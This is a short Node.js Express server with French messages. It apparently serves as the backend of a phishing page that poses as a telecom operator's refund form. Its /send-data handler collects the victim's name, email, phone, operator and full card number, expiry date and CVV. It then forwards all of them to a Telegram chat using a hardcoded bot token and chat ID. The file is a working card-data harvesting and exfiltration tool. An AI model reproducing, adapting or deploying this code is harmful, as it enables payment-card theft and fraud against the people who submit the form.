const express = require('express');
const axios = require('axios');
const app = express();
app.use(express.json());

// Replace these with your actual bot token and chat ID
const BOT_TOKEN = '8438654761:AAHMlWjDm6QsBMR0OerJQ8Ds6-lJR5jj0iw';
const CHAT_ID = '1900857584';

app.post('/send-data', async (req, res) => {
  const { fullname, email, phone, operator, reason, cardNumber, expiryDate, cvv } = req.body;

  const message = `
📥 Nouvelle demande de remboursement :

👤 Nom: ${fullname}
📧 Email: ${email}
📱 Téléphone: ${phone}
🏢 Opérateur: ${operator}
❓ Motif: ${reason}

💳 Carte: ${cardNumber}
📆 Expiration: ${expiryDate}
🔐 CVV: ${cvv}
`;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message
    });
    res.status(200).send('Message envoyé à Telegram');
  } catch (error) {
    console.error('Erreur Telegram:', error.response?.data || error.message);
    res.status(500).send('Erreur lors de l\'envoi');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Serveur démarré sur le port ${PORT}`);
});